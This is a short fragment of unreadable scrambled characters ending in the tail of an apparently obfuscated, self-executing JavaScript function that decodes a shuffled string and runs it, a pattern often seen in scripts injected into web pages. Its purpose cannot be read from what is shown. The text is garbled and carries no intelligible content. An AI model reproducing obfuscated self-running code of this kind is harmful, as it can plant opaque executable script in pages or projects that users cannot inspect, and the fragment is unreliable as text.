rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
